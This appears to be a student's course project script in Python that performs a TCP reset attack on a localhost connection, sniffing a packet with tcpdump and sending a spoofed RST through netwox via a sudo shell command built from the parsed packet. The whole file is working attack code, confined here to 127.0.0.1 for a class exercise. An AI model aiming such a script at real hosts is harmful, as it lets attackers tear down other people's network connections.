'''
RSTLocal.py
Sophie Crane and Elizabeth Carney
CSC327 Final Project

Performs a TCP reset attack on a localhost connection.
See README for instructions to run.
'''

import os
import subprocess

''' Logs sniffed packet and its important info '''
def logRST_TCPDUMP(p):
    p = p.split( )
    seq = p[10][:-1] #seq = p[8].split(":")[0]
    dst_port = p[2].split(".")[1]

    netwoxSendRST(dst_port, seq)

    print("Packet sniffed: ", p)
    print("Seq number: ", seq)
    print("Destination port:", dst_port)


''' Uses netwox to send a spoofed RST packet '''
def netwoxSendRST(dst_port, seq):
    # Spoof Ip4Tcp netwox tool:
    # sudo netwox 40 -l 127.0.0.1 -m 127.0.0.1 -o 8000 -p <d_port> -q <seq_num> -B
    os.system("sudo netwox 40 -l 127.0.0.1 -m 127.0.0.1 -o 8000 -p %s -q %s -B" % (dst_port, seq))


''' Sniffs network traffic for packets on localhost connection '''
def sniffPackets():
    print("Sniffing for packets on 127.0.0.1")
    p = subprocess.Popen(['tcpdump', '-i', 'lo0', 'src 127.0.0.1 and dst port 8000', '-c', '1'], stdout=subprocess.PIPE)
    logRST_TCPDUMP(p.stdout.read().decode('utf-8'))


def main():

    sniffPackets()


if __name__ == '__main__':
    main()
